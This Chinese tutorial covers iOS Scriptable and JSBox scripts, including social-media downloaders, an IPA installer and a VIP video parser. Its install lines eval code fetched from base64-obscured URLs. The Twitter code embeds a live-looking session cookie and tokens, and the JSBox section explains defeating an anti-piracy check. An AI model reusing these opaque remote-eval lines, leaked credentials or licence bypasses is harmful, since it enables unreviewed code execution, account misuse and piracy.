eval(await (new Request(Data.fromBase64String("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2t6ZGRjay11cC9zY3JpcHRhYmxlcy9tYWluL2lzbnRhbGwveW91dHViZWRvd24uanM=").toRawString())).loadString());await Script.Installer()
```

源码地址如下。

```
https://raw.githubusercontent.com/kzddck-up/scriptables/main/youtubedown.js
```

源码如下。

```
async function geturl(url) {
    id = url.replace("https://youtu.be/", "")
    //拼接url
    newurl = `https://www.youtube.com/get_video_info?video_id=${id}&el=detailpage`,
        req = new Request(newurl)
    res = await req.loadString()
    re = /player_response=.+&enablecsi/
    datas = unescape(res.match(re)[0].replace('player_response=', '').replace('&enablecsi', '')).replace(/\\"/g, "'")
    //log(datas)
    playerResponse = JSON.parse(datas).streamingData.formats
    len = playerResponse.length - 1
    return { "code": "200", "msg": "成功", "data": { "downurl": [{ "url": playerResponse[len].url }] } }
}
async function getimg(url) {
    if (url == null) {
        log(url)
        var url = 'http://p6.itc.cn/images03/20200520/490c762cd4f3430786920e074180cc27.jpeg'
    }
    req = new Request(url)
    img = await req.loadImage()
    return img
}

async function run(url) {
    try {
        var data = await geturl(url)
        Pasteboard.copy(JSON.stringify(data))
        const cb = new CallbackURL("shortcuts://x-callback-url/run-shortcut")
        cb.addParameter("name", "scriptable下载器")
        await cb.open()

    } catch {
        const n = new Notification()
        var data = await geturl(url)
        n.title = "下载失败，解析后的下载链接已复制，请借助其他第三方工具进行下载"
        n.schedule()
        Pasteboard.copy(JSON.stringify(data.data.downurl[0].url))
    }
}


//获取粘贴板
url = Pasteboard.paste()
imgurl = args.widgetParameter
fm = FileManager.local()
try {
    if (url.indexOf('youtu.be') > 0) {
        await run(url)
    } else {
        img = await getimg(imgurl)
        pic_cache_path = fm.joinPath(fm.documentsDirectory(), `youtube`)
        fm.writeImage(pic_cache_path, img)
        const widget = new ListWidget()
        widget.setPadding(0, 0, 0, 0)
        const info_stack = widget.addStack()
        info_stack.layoutVertically()
        info_stack.addSpacer()
        const name_stack = info_stack.addStack()
        info_stack.setPadding(10, 10, 5, 10)
        name_stack.addSpacer()
        widget.backgroundImage = img
        widget.presentSmall()
        Script.setWidget(widget)
        Script.complete()
    }
} catch {
    var img = await getimg(imgurl)
    pic_cache_path = fm.joinPath(fm.documentsDirectory(), `youtube`)
    fm.writeImage(pic_cache_path, img)
    const widget = new ListWidget()
    widget.setPadding(0, 0, 0, 0)
    const info_stack = widget.addStack()
    info_stack.layoutVertically()
    info_stack.addSpacer()
    const name_stack = info_stack.addStack()
    info_stack.setPadding(10, 10, 5, 10)
    name_stack.addSpacer()
    widget.backgroundImage = img
    widget.presentSmall()
    Script.setWidget(widget)
    Script.complete()
}
```

需要配合以下快捷指令。

```
https://www.icloud.com/shortcuts/5f5b29677242493ca5601fdb3d32d146
```

在桌面添加Scriptable的小组件，长按编辑后Script选择刚才下载的脚本，When Interacting选择Run Script，Parameter填写需要显示的网络图片链接，可不填写。

#### YouTube后台播放与浮窗

将以下内容复制到Scriptable的脚本内容，运行以完成下载。

```
eval(await (new Request(Data.fromBase64String("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2t6ZGRjay11cC9zY3JpcHRhYmxlcy9tYWluL2lzbnRhbGwveW91dHViZS5qcw==").toRawString())).loadString());await Script.Installer()
```

源码地址如下。

```
https://raw.githubusercontent.com/kzddck-up/scriptables/main/youtube.js
```

源码如下。

```
async function open(url){
id = url.replace("https://youtu.be/","")
//拼接url
newurl = `https://www.youtube.com/get_video_info?video_id=${id}&el=detailpage`,
req = new Request(newurl)
res = await req.loadString()
re = /player_response=.+&enablecsi/
datas =unescape( res.match(re)[0].replace('player_response=', '').replace('&enablecsi', '')).replace(/\\"/g, "'")
//log(datas)
playerResponse = JSON.parse(datas).streamingData.formats
log(playerResponse)
len = playerResponse.length - 1
log(len)
Safari.open(playerResponse[len].url)
}
      
async function getimg(url) {
    if(url == null){
    var url = 'https://is3-ssl.mzstatic.com/image/thumb/Purple125/v4/84/1d/9a/841d9afa-769a-8355-5a67-3c846e6e8a92/logo_youtube_color-0-0-1x_U007emarketing-0-0-0-6-0-0-sRGB-0-0-0-GLES2_U002c0-512MB-85-220-0-0.png/460x0w.png'
    }
    req = new Request(url)
    img = await req.loadImage()
    return img
}


//获取粘贴板
url = Pasteboard.paste()
imgurl = args.widgetParameter
fm = FileManager.local()
try {
    if (url.indexOf('youtu.be') > 0) {
      log(url)
        await open(url)

    } else {
        img = await getimg(imgurl)
        pic_cache_path = fm.joinPath(fm.documentsDirectory(), `youtube`)
        fm.writeImage(pic_cache_path, img)
        const widget = new ListWidget()
        widget.setPadding(0, 0, 0, 0)
        const info_stack = widget.addStack()
        info_stack.layoutVertically()
        info_stack.addSpacer()
        const name_stack = info_stack.addStack()
        info_stack.setPadding(10, 10, 5, 10)
        name_stack.addSpacer()
        widget.backgroundImage = img
        widget.presentSmall()
        Script.setWidget(widget)
        Script.complete()
    }
} catch {
    var img = await getimg(imgurl)
        pic_cache_path = fm.joinPath(fm.documentsDirectory(), `youtube`)
        fm.writeImage(pic_cache_path, img)
        const widget = new ListWidget()
        widget.setPadding(0, 0, 0, 0)
        const info_stack = widget.addStack()
        info_stack.layoutVertically()
        info_stack.addSpacer()
        const name_stack = info_stack.addStack()
        info_stack.setPadding(10, 10, 5, 10)
        name_stack.addSpacer()
        widget.backgroundImage = img
        widget.presentSmall()
        Script.setWidget(widget)
        Script.complete()
    }
```

#### Twitter下载器

将以下内容复制到Scriptable的脚本内容，运行以完成下载。

```
eval(await (new Request(Data.fromBase64String("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2t6ZGRjay11cC9zY3JpcHRhYmxlcy9tYWluL2lzbnRhbGwvdHdpdHRlci5qcw==").toRawString())).loadString());await Script.Installer()
```

源码地址如下。

```
https://raw.githubusercontent.com/kzddck-up/scriptables/main/twitter.js
```

源码如下。

```
async function geturl(url) {
    //正则获取ID
    var reg = /status\/.+?s/
    var id = url.match(reg)[0].replace("status/", "").replace("?s", "")
    //拼接链接
    newurl = `https://twitter.com/i/api/2/rux.json?include_profile_interstitial_type=1&include_blocking=1&include_blocked_by=1&include_followed_by=1&include_want_retweets=1&include_mute_edge=1&include_can_dm=1&include_can_media_tag=1&skip_status=1&cards_platform=Web-12&include_cards=1&include_ext_alt_text=true&include_quote_count=true&include_reply_count=1&tweet_mode=extended&include_entities=true&include_user_entities=true&include_ext_media_color=true&include_ext_media_availability=true&send_error_codes=true&simple_quoted_tweet=true&count=20&refsrc_tweet=${id}&ext=mediaStats%2ChighlightedLabel`
    req = new Request(newurl)
    req.headers = {
        'authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA',
        'x-csrf-token': '6b1630e1f241d254d9153f65b7f4964162f0dd82630fedc22a5b3296bb95921969dd2fb42c9a467bf2b946d1a29a2c2c80b539878f8292c67d0390d36a5b6c20ccc5c24e340576e20f09db0289dd5eed',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36',
        'cookie': 'personalization_id="v1_8UVOoVElzxPp9CuNtl/iSg=="; guest_id=v1%3A160448369085699039; _ga=GA1.2.421831687.1604483695; ads_prefs="HBIRAAA="; kdt=FtMUFMORvePD6YiNwXSOzScIiQ9MdlRlFyMPTHi7; remember_checked_on=1; auth_token=975bccf8a89e94c0380d1af0a7c74be8f371ae15; twid=u%3D854241868959203328; ct0=6b1630e1f241d254d9153f65b7f4964162f0dd82630fedc22a5b3296bb95921969dd2fb42c9a467bf2b946d1a29a2c2c80b539878f8292c67d0390d36a5b6c20ccc5c24e340576e20f09db0289dd5eed; external_referer=8e8t2xd8A2w%3D|0|S38otfNfzYt86Dak8Eqj76tqscUAnK6Lq4vYdCl5zxIvK6QAA8vRkA%3D%3D; lang=zh-cn; _gid=GA1.2.1842089217.1610347795',
    }
    //获取json
    html = await req.loadJSON()
    //拍断是否为视频,try为视频，url为图片
    try {
        downurl = html.globalObjects.tweets[id].extended_entities.media[0].video_info.variants[0].url
        return { "code": "200", "msg": "成功", "data": { "downurl": [{ "url": downurl }] } }
    }
    catch {
        //否则是图片
        data = html.globalObjects.tweets[id].entities.media
        var downurl = []
        for (var i = 0; i < data.length; i++) {
            url = data[i].media_url_https
            downurl.push({ "url": url })
        }
        log(downurl)
        return {
            "code": "200", "msg": "成功", "data": { downurl }
        }
    }
}
async function getimg(url) {
    if(url == null){
        log(url)
    var url = 'https://abs.twimg.com/responsive-web/client-web-legacy/icon-ios.b1fc7275.png'
    }
    req = new Request(url)
    img = await req.loadImage()
    return img
}
async function run(url) {
    try {
        log(url)
        var data = await geturl(url)
        Pasteboard.copy(JSON.stringify(data))
        const cb = new CallbackURL("shortcuts://x-callback-url/run-shortcut")
        cb.addParameter("name", "scriptable下载器")
        await cb.open()
    } catch {
        const n = new Notification()
        n.title = "下载失败，请保证是正确的链接"
        n.schedule()
    }
}
var url = Pasteboard.paste()
var imgurl = args.widgetParameter
var fm = FileManager.local()
try {
    if (url.indexOf('twitter.com') > 0) {
        await run(url)

    } else {
        var img = await getimg(imgurl)
        let pic_cache_path = fm.joinPath(fm.documentsDirectory(), `twitter`)
        fm.writeImage(pic_cache_path, img)
        const widget = new ListWidget()
        widget.setPadding(0, 0, 0, 0)
        const info_stack = widget.addStack()
        info_stack.layoutVertically()
        info_stack.addSpacer()
        const name_stack = info_stack.addStack()
        info_stack.setPadding(10, 10, 5, 10)
        name_stack.addSpacer()
        var image = img
        widget.backgroundImage = image
        widget.presentSmall()
        Script.setWidget(widget)
        Script.complete()
    }
} catch {
    var img = await getimg(imgurl)
        let pic_cache_path = fm.joinPath(fm.documentsDirectory(), `twitter`)
        fm.writeImage(pic_cache_path, img)
        const widget = new ListWidget()
        widget.setPadding(0, 0, 0, 0)
        const info_stack = widget.addStack()
        info_stack.layoutVertically()
        info_stack.addSpacer()
        const name_stack = info_stack.addStack()
        info_stack.setPadding(10, 10, 5, 10)
        name_stack.addSpacer()
        var image = img
        widget.backgroundImage = image
        widget.presentSmall()
        Script.setWidget(widget)
        Script.complete()
}
```

需要配合以下快捷指令。

```
https://www.icloud.com/shortcuts/13bb4a3463834c6db6f27f3acf2d3c7a
```

在桌面添加Scriptable的小组件，长按编辑后Script选择刚才下载的脚本，When Interacting选择Run Script，Parameter填写需要显示的网络图片链接，可不填写。

#### IG下载器

将以下内容复制到Scriptable的脚本内容，运行以完成下载。

```
eval(await (new Request(Data.fromBase64String("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2t6ZGRjay11cC9zY3JpcHRhYmxlcy9tYWluL2lzbnRhbGwvaW5zLmpz").toRawString())).loadString());await Script.Installer()
```

源码地址如下。

```
https://raw.githubusercontent.com/kzddck-up/scriptables/main/insdown.js
```

源码如下。

```
async function getdata() {
    try {
        //获取剪贴板
        var url = Pasteboard.paste()
        log(url)
        //判断这是哪里的链接（快拍和普通）

        //这里是快拍
        if (url.indexOf('instagram.com/s/') >= 0 || url.indexOf('instagram.com/stories/') >= 0) {
            req = new Request(url)
            html = await req.loadString()
            //判断是哪一种快拍
            if (url.indexOf('instagram.com/stories/') >= 0) {
                var reg = /(\[{"user":{"id":")([\s\S]*)[1-9a-zA-Z]*(profile_pic_url")/
                var id = html.match(reg)[0].replace('[{"user":{"id":"', '').replace('","profile_pic_url"', '')
            }
            else {
                var reg = /(https:\/\/www.instagram.com\/stories\/)([\s\S]*?)[1-9a-zA-Z]*(\/" \/>)/
                var id = "highlight:" + html.match(reg)[0].replace('/" />', '').replace('https://www.instagram.com/stories/highlights/', '')
            }
            //拼接查询api
            var newurl = "https://i.instagram.com/api/v1/feed/reels_media/?reel_ids=" + id
            var req = new Request(newurl)
            //标识符
            req.headers = { 'x-ig-app-id': '936619743392459' }
            var apiHtml = await req.loadString()
            var list = JSON.parse(apiHtml).reels[id].items
            var downurl = []
            //for循环downurl
            for (var i = 0; i < list.length; i++) {
                if (list[i].video_versions) {
                    var url = list[i].video_versions[0].url
                    downurl.push({ url: url })
                } else {
                    var url = list[i].image_versions2.candidates[0].url
                    downurl.push({ url: url })
                }
            } log(downurl)
            return {
                code: 200, data: { downurl: { url: downurl } }
            }
        } else {
            var req = new Request(url)
            var html = await req.loadString()
            //正则并转换为json
            var reg = /({"graphql":)([\s\S]*?)[1-9a-zA-Z]*(:{"edges":\[]}}}})/
            var data = JSON.parse(html.match(reg)[0].replace('\u0026', '&'))

            var downurl = data.graphql.shortcode_media

            //如果只有一个下载对象，则直接返回
            if (downurl.video_url) return { code: 200, data: { downurl: { url: { url: downurl.video_url } } } }
            //判断是一张图片还是多张图片
            var urllists = JSON.parse(html.match(reg)[0].replace('\u0026', '&')).graphql.shortcode_media
            if (urllists.edge_sidecar_to_children === undefined) {
                var downurl = urllists.display_url
                return { code: 200, data: { downurl: { url: { url: downurl } } } }
            } else {
                //多张图片
                var urlList = JSON.parse(html.match(reg)[0].replace('\u0026', '&')).graphql.shortcode_media.edge_sidecar_to_children.edges
                //判断是否存在多个视频
                var downurl = []
                for (var i = 0; i < urlList.length; i++) {
                    if (urlList[i].node.video_url) {
                        var url = urlList[i].node.video_url
                        downurl.push({ url: url })
                    } else {
                        var urls = urlList[i].node.display_resources
                        var urll = urls.length
                        downurl.push({ url: urls[urll - 1].src })
                    }
                }
            }
            return { code: 200, data: { downurl: { url: downurl } } }
        }
    } catch {
        //报错则说明为登录
        //登录ins，保存cookie
        const loginUrl = "https://www.instagram.com/accounts/login/";
        const webview = new WebView();
        await webview.loadURL(loginUrl);
        await webview.present();
        const req = new Request("https://www.instagram.com/")
        req.method = "get"
        const res = await req.loadString()
        const cookies = req.response.cookies
        var arr = ''
        //遍历cookie
        for (var i = 0; i < cookies.length; i++) {
            arr += cookies[i].name + "=" + cookies[i].value + ";"
        }
        //写入cookie缓存
        Keychain.set("cookieCase", arr)
    }
}
async function run() {
    try {
        var data = await getdata()
        //log(data)
        Pasteboard.copy(JSON.stringify(data))
        const cb = new CallbackURL("shortcuts://x-callback-url/run-shortcut")
        cb.addParameter("name", "ins下载器")
        await cb.open()
        //Safari.open("instagram://")
    } catch {
        const n = new Notification()
        n.title = "请保证ins是正确的链接，不要包含中文"
        n.schedule()
    }
}
async function getimg(url) {
    if (url == null) {
        url = 'https://is5-ssl.mzstatic.com/image/thumb/Purple125/v4/4d/6e/da/4d6edaef-f2d7-53cf-b81a-e3e23375d4ee/Prod-0-0-1x_U007emarketing-0-0-0-7-0-0-sRGB-0-0-0-GLES2_U002c0-512MB-85-220-0-0.png/460x0w.png'

    }
    req = new Request(url)
    img = await req.loadImage()
    return img
}


var url = Pasteboard.paste()
var imgurl = args.widgetParameter
var fm = FileManager.local()
try {
    if (url.indexOf('instagram.com') >= 0) {
        await run()
    } else {
        var img = await getimg(imgurl)
        let pic_cache_path = fm.joinPath(fm.documentsDirectory(), `insimages`)
        fm.writeImage(pic_cache_path, img)


        var img = fm.readImage(pic_cache_path)
    }
    const widget = new ListWidget()
    widget.setPadding(0, 0, 0, 0)
    const info_stack = widget.addStack()
    info_stack.layoutVertically()
    info_stack.addSpacer()
    const name_stack = info_stack.addStack()
    info_stack.setPadding(10, 10, 5, 10)
    name_stack.addSpacer()
    widget.backgroundImage = img
    widget.presentSmall()
    Script.setWidget(widget)
    Script.complete()
}
//await run()
catch {

    var fm = FileManager.local()
    var img = await getimg(imgurl)

    let pic_cache_path = fm.joinPath(fm.documentsDirectory(), `insimages`)
    fm.writeImage(pic_cache_path, img)

    const widget = new ListWidget()
    widget.setPadding(0, 0, 0, 0)
    const info_stack = widget.addStack()
    info_stack.layoutVertically()
    info_stack.addSpacer()
    const name_stack = info_stack.addStack()
    info_stack.setPadding(10, 10, 5, 10)
    name_stack.addSpacer()
    widget.backgroundImage = img
    widget.presentSmall()
    Script.setWidget(widget)
    Script.complete()
}
```

## Working Copy

Working Copy可以挂载Github仓库到本地。

打开Working Copy，点击`+`-Setup synced directory，选择要挂载到本地的路径。

完成后点击Done，然后点击Repository，进入后点击Add Remote，在URL后面粘贴仓库地址，Allow Push后面的按钮关闭，Name可以自定义，也可以使用默认，完成后点击右上角的Save。

然后点击REMOTES下刚才添加的内容，点击左上角的Fetch，一般第一次都会失败，第二次会成功。成功后点击左上角的返回按钮，一直返回到首页位置。点击刚添加的内容，即可看到本地仓库内容。

## JSBox

### 安装

用Safari浏览器打开以下链接即可。

```
// 1.45.0版本
https://www.lanzous.com/i3xfhmf

// 1.36.0版本
https://www.lanzous.com/i2ot3ng
```

若出现盗版弹窗，需进行屏蔽。若已越狱，可用Filza的App管理器定位到JSBox的文件位置，在storekit文件夹找到receipt，右滑删除，后退后点击i，把storekit文件夹设置为禁止写入。后退并进入JSBox文件夹，将Patch文件夹设置为禁止写入，进入Patch并删除main.js，退出即可。

### 脚本

#### 脚本安装器

打开JSBox，点右上角`+`-创建新脚本，复制以下代码并保存。

```
if ($app.info.bundleID == "app.cyan.pin") {
    $ui.alert("该脚本不支持Pin！\n只支持JSBox \n\npin请使用复制代码方式添加");
    $app.openURL("http://qq.cn.hn/g4s");
    return;
}

if ($app.env == $env.action) {
    var data = $context.data
    var name = data.fileName
    install(data, name)
    return;
}

var link = $clipboard.link
if (link) {
    if (link.indexOf('jsbox://') !== -1) {
        urlcl(link)
    } else {
        $http.get({
            url: link,
            header: {
                "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1"
            },
            handler: function (resp) {
                var data = resp.data
                var link = data.match(/jsbox:\/\/(\S*?)\'/)[1]
                urlcl(link)
            }
        })
    }

} else {
    $ui.alert({
        title: "温馨提示:",
        message: "\n请先复制脚本链接再运行！\n\n不会使用？看看教程吧！",
        actions: [{
            title: "查看图文教程",
            handler: function () {
                $app.openURL("http://qq.cn.hn/g43");
            }
        },{
            title: "观看视频教程",
            handler: function () {
                $app.openURL("http://t.cn/E2gUpNI");
            }
        },{
            title: "取消"
        }]

    });
}

function urlcl(link) {
    var shu = link.split("&")
    var url = $text.URLDecode(shu[0].split("url=")[1])
    if (url.indexOf('/blob/master/') !== -1) {
        url = url.replace(/\/blob\/master\//, "/raw/master/")
    }
    var name = $text.URLDecode(shu[1].split("name=")[1])
    $ui.toast("正在安装中 ...");
    $http.download({
        url: url,
        handler: function (resp) {
            install(resp.data, name)
        }
    })
}

function install(data, name) {
    $addin.save({
        name: name,
        data: data,
        handler: function () {
            $ui.alert({
                title: "安装完成",
                message: "\n是否打开？\n" + name,
                actions: [
                    {
                        title: "打开",
                        handler: function () {
                            $app.openExtension(name)
                            $app.close(delay)
                        }
                    },
                    {
                        title: "不了"
                    }]
            });
        }
    })
}
```

下载脚本文件后，点击分享扩展界面的`用JSBox打开`，再点脚本安装器右边的小三角，即可导入其它脚本。

#### IPA安装器

打开JSBox，点右上角`+`-创建新脚本，复制以下代码并保存。

使用时找到下载好的IPA，点击分享扩展界面的JSBox，选择保存好的规则即可。

```
/*
IPA 文件安装器
- 支持文件分享安装
- 支持主程序运行选择文件安装
- 安装完成后请返回运行界面选择后续操作

作者联系：https://t.me/axel_burks
*/

var port_number = 8080
var plist_url = "itms-services://?action=download-manifest&url=https://suisr.coding.net/p/PlistServer/d/PlistServer/git/raw/master/universal_jsbox.plist"

$app.strings = {
  "en": {
    "starterror": "Not support running in this way",
    "ftypeerror": " is not ipa file",
    "installtitle": "Installing...",
    "installmsg": "\n\nYou can check on Homescreen.\nPlease tap \"Done\" button after finished",
    "inerrtitle": "IPA file import error",
    "inerrmsg": "Please rerun the script"
  },
  "zh-Hans": {
    "starterror": "不支持此方式运行！",
    "ftypeerror": " 非 ipa 文件！",
    "installtitle": "正在安装…",
    "installmsg": "\n\n可前往桌面查看安装进度\n完成后请点击\"Done\"按钮",
    "inerrtitle": "IPA文件导入失败",
    "inerrmsg": "请重新运行此脚本"
  }
}

// 从应用内启动
if ($app.env == $env.app) {
  $drive.open({
    handler: function(data) {
      fileCheck(data)
    }
  })
}
// 从 Action Entension 启动
else if ($app.env == $env.action) {
  fileCheck($context.data)
}

else {
  $ui.error($l10n("starterror"))
  delayClose(2)
}


function startServer(port) {
  $http.startServer({
    port: port,
    path: "",
    handler: function(result) {
      console.info(result.url)
    }
  })
}

function fileCheck(data) {
  if (data && data.fileName) {
    var fileName = data.fileName;
    if (fileName.indexOf(".ipa") == -1) {
      $ui.error(fileName + $l10n("ftypeerror"))
      delayClose(2)
    } else {
      install(fileName, data);
    }
  }
}

function install(fileName, file) {
  var result = $file.write({
    data: file,
    path: "app.ipa"
  })
  if (result) {
    startServer(port_number)
    $location.startUpdates({
      handler: function(resp) {
        console.info(resp.lat + " " + resp.lng + " " + resp.alt)
      }
    })
    var preResult = $app.openURL(plist_url);
    if (preResult) {
      $ui.alert({
        title: $l10n("installtitle"),
        message: "\n" + fileName + $l10n("installmsg"),
        actions: [{
          title: "Cancel",
          style: "Cancel",
          handler: function() {
            $http.stopServer()
            $file.delete("app.ipa")
            delayClose(0.2)
          }
        },
        {
          title: "Done",
          handler: function() {
            $http.stopServer()
            $file.delete("app.ipa")
            delayClose(0.2)
          }
        }]
      })
    } else {
      $ui.alert({
        title: "Open itms-services scheme failed",
        message: "Please contact the author @axel_burks",
        actions: [{
          title: "Cancel",
          style: "Cancel",
          handler: function() {
            delayClose(0.2)
          }
        },
        {
          title: "OK",
          handler: function() {
            $app.openURL("tg://resolve?domain=axel_burks")
          }
        }]
      })
    }
  } else {
    $ui.alert({
      title: $l10n("inerrtitle"),
      message: $l10n("inerrmsg"),
      actions: [{
        title: "OK",
        style: "Cancel",
        handler: function() {
          delayClose(0.2)
        }
      }]
    })
  }
}

function delayClose(time) {
    $location.stopUpdates()
    $thread.main({
      delay: time,
      handler: function() {
        if ($app.env == $env.action || $app.env == $env.safari) {
          $context.close()
        }
        $app.close()
      }
    })
}
```

#### 视频VIP解析

打开JSBox，点右上角`+`-创建新脚本，复制以下代码并保存。

```
//anton.j@2017-10-22 Ver1.0

/*---------head---------*/
var warn = 0 //(0 or 1)

$app.strings = {
  "en": {
    "mrjk": "Port0",
    "xzjk": " Add port",
//......
  },
  "zh-Hant": {
    "解析口1": "默认接口❈",
    "xzjk": "新增接口⊕",
//......
  }
}

var ports = [
  { name: $l10n("解析口1"), url: "http://www.82190555.com/index/qqvod.php?url=" },
  { name: "解析口2", url: "https://jiexi.071811.cc/jx.php?url=" },
  { name: "解析口3", url: "http://jx.api.163ren.com/vod.php?url=" },
  { name: "备用1口", url: "http://jx.aeidu.cn/index.php?url=" },
  { name: "备用口2", url: "http://q.z.vip.totv.72du.com/?url=" },
  { name: $l10n("备用口3"), url: "http://aikan-tv.com/?url=" },
]

var NET = [
  { name: "默认", url: "http://m.v.qq.com" },
  { name: "奇艺", url: "http://m.iqiyi.com" },
  { name: "优酷", url: "http://m.vip.youku.com" },
  { name: "腾讯", url: "http://m.v.qq.com" },
  { name: "乐视", url: "http://m.le.com/vip/" },
  { name: "芒果", url: "http://m.mgtv.com/#/channel/home" },
  { name: "搜狐", url: "http://m.tv.sohu.com/film" },
  { name: "音悦", url: "http://m.yinyuetai.com" },
  { name: "PPTV", url: "http://m.pptv.com/?location=m_channel_vip" },
]

var searchNET = [
  { name: "默认搜", net: "http://m.v.sogou.com/vw/search.jsp" },
  { name: "影视", net: "http://ifkdy.com/" },
  { name: "电视", net: "http://iptv.hk.cn/" },
  { name: "音乐", net: "http://music.2333.me" },
  { name: "广播", net: "http://m.qingting.fm/categories/5" },
  { name: "动漫", net: "http://m.acfun.tv/search/" },
  { name: "直播", net: "https://www.douyu.com" },
  { name: "新增站", net: "http://hwkxk.cn/music/" },
]

var Cha = searchNET[0].net //(0~7)
var ChaN = searchNET[0].name //(0~7)
var Port = ports[0].url //(0~4)
var PoetN = ports[0].name //(0~4)
var Site = NET[0].url //(0~8)

/*------------head----------*/


//main
var r = /\w{2,10}\.com/
var i = 0
var reg = ""
while (NET[i]) {
  if (reg.length !== 0) {
    var reg = r.exec(NET[i].url) + ".*html|" + reg
  } else {
    var reg = r.exec(NET[i].url) + ".*html" + reg
  }
  i++
}
var reg = reg + "|mgtv.com/#/"

if (warn == 1) {
  $ui.toast("anton.j的提醒:运行此脚本建议关闭SSR及相关")
} else {}

if (typeof($context.safari) == "undefined") {
  var link = $context.link || $clipboard.link ? $context.link || $clipboard.link : ""
} else {
  var link = $context.safari.items.location.href
}
if (link.search(reg) == -1) {} else {
  $ui.alert({
    title: "直接解析播放如下链接:\n\n" + link,
    actions: [{
        title: "OK",
        handler: function() {
          parse_play(link)
        }
      },
      {
        title: "Cancel",
        style: "Cancel",
      },
    ]
  })
}
main(Site)

//all function
function main(url) {
  $ui.render({
    props: {
      title: "全网—VIP影音播放搜索"
    },
    views: [{
        type: "web",
        props: {
          id: "videoweb",
          url: Site,
          toolbar: true,

          script: function() {
            var Html = window.parent.location.href
            $notify("customEvent", Html)
          }

        },
        layout: function(make, view) {
          make.top.inset(28)
          make.bottom.right.left.inset(0)
        },

        events: {
          customEvent: function(object) {
            //$clipboard.text = obj
            $("videoweb").title = object
          }
        }

      },

      {
        type: "tab",
        props: {
          id: "headmenu",
          items: NET.map(function(item) {
            return item.name
          }),
          bgcolor: $rgb(255, 255, 255),
          radius: 6,
          tintColor: $color("#424242")
        },
        layout: function(make, view) {
          make.top.left.right.inset(1)
          make.height.equalTo(25)
        },
        events: {
          changed: function(sender) {
            var Site = NET[sender.index].url
            var Title = NET[sender.index].name
            $("videoweb").url = Site
          }
        }
      },

      {
        type: "label",
        props: {
          id: "textlabel",
          font: $font(11),
          text: "----------请至VIP视频最终页面点击[解析]键 ----------",
          textColor: $color("#d2691e"),
          bgcolor: $rgb(255, 255, 255),
          radius: 8,
          align: $align.center
        },
        layout: function(make, view) {
          make.bottom.inset(0)
          make.left.right.inset(0)
          make.height.equalTo(11)
          make.centerX.equalTo(view.super)
        }
      },

      {
        type: "button",
        props: {
          id: "play",
          title: "解析▷",
          bgcolor: $rgb(210, 105, 30),
          titleColor: $color("white "),
          font: $font(15)
        },
        layout: function(make, view) {
          make.right.inset(1)
          make.bottom.inset(45)
          make.width.equalTo(55)
          make.height.equalTo(32)
        },
        events: {
          tapped: function(sender) {
            var link = $("videoweb").title
            //var link = $clipboard.link
            if (link.search(reg) == -1) {
              $ui.alert("【当前视频地址不正确】\n\n请至视频最终页面再点[解析]键\n")
            } else {
              $ui.toast(link)
              parse_play(link)
            }
          }
        }
      },

      {
        type: "button",
        props: {
          id: "search",
          title: "搜索 θ",
          bgcolor: $rgb(233, 233, 233),
          titleColor: $color("red"),
          font: $font(15)
        },
        layout: function(make, view) {
          make.left.inset(1)
          make.bottom.inset(45)
          make.width.equalTo(55)
          make.height.equalTo(32)
        },
        events: {
          tapped: function(sender) {
            searchvideo(Cha, ChaN)
          }
        },
      }
    ]
  })
}

function parse_play(url) {
  $ui.push({
    views: [{
        type: "web",
        props: {
          id: "playweb",
          title: "全网—VIP影音播放搜索",
          url: Port + url,
          //toolbar: true
        },
        layout: $layout.fill
      },
      {
        type: "tab",
        props: {
          id: "bottommenu",
          items: ports.map(function(item) {
            return item.name
          }),
          bgcolor: $rgb(66, 66, 66),
          radius: 6,
          tintColor: $color("#d2691e")
        },
        layout: function(make, view) {
          make.left.right.inset(2)
          make.bottom.inset(2)
          make.height.equalTo(30)
        },
        events: {
          changed: function(sender) {
            var Port = ports[sender.index].url
            var PortN = ports[sender.index].name

            if (PortN.search("新增") == -1) {
              $("playweb").url = Port + url
            } else {
              addport(Port, PortN)
            }

          }
        }
      },
    ]
  })
}

function searchvideo(Cha, ChaN) {
  $ui.push({
    views: [{
        type: "web",
        props: {
          id: "searchweb",
          title: "全网—VIP影音播放搜索",
          url: Cha,
          toolbar: true
        },
        layout: $layout.fill
      },
      {
        type: "tab",
        props: {
          items: searchNET.map(function(item) {
            return item.name
          }),
          bgcolor: $rgb(255, 255, 255),
          radius: 6,
          tintColor: $color("#d2691e"),
          font: $font(12)
        },
        layout: function(make, view) {
          make.left.right.inset(1)
          make.bottom.inset(44)
          make.height.equalTo(30)
        },
        events: {
          changed: function(sender) {
            var Cha = searchNET[sender.index].net
            var ChaN = searchNET[sender.index].name

            /*------后期修改搜索入口1------*/
            if (ChaN == "影视") {
              dybee($("search".url))
            }
            /*else if(ChaN=="电视"){
              addXX1($("search".url))
            } else if(ChaN=="广播"){
              addXX2($("search".url))
            } else if(ChaN=="音乐"){
              addXX3($("search".url))
            } else if(ChaN=="动漫"){
              addXX4($("search".url))
            } else if(ChaN=="直播"){
              addXX5($("search".url))
            } */
            else if (ChaN == "新增站") {
              addXX6($("search".url))
            } else {
              $("searchweb").url = Cha
            }
            /*------后期修改搜索入口1------*/

          }
        }
      },
    ]
  })
}

function dybee(url) {
  $ui.push({
    views: [{
        type: "input",
        props: {
          id: "inputDy",
          type: $kbType.search,
          text: "战狼",
          font:$font(11),
          textColor:$color("red"),
          darkKeyboard: true,

        },
        layout: function(make, view) {
          make.top.left.inset(10)
          make.height.equalTo(30)
          make.width.equalTo(200)
        },
        events: {
          changed: function(sender) {
            $("inputDy").text
          }
        }
      },
      
/*----edit----*/






      {
        type: "list",
        props: {
          id: "dybee",
          data: ["搜索","推荐", "电影", "电视"]
        },
        layout: function(make, view) {
          make.top.equalTo($("inputDy").bottom).offset(10)
          make.left.right.inset(1)
